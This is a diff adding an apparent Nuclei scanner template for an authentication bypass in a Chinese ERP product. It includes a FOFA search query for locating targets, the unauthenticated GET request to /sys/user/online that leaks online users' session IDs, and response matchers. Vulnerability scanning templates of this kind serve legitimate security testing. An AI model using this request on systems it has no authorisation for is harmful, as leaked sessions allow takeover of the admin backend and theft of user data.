@@ -1,0 +1,29 @@
+id: yunshikongERP-user_online-Authentication-bypass
+
+info:
+  name: 云时空社会化商业ERP系统 user/online 身份认证绕过漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: title="云时空社会化商业ERP系统"
+    云时空社会化商业ERP系统 user/online 接口存在身份认证绕过漏洞，未授权的攻击者可利用漏洞url获取在线用户sessionid 导致用户信息泄露，并且切换网站session后可直接接管后台，造成信息泄露或恶意破坏，使系统处于极不安全状态。
+
+  tags: Authentication bypass
+  
+
+http:
+  - raw:
+      - |
+        GET /sys/user/online HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"sessionid":'
+          - '"tomcat":'
+      - type: status
+        status: 
+          - 200
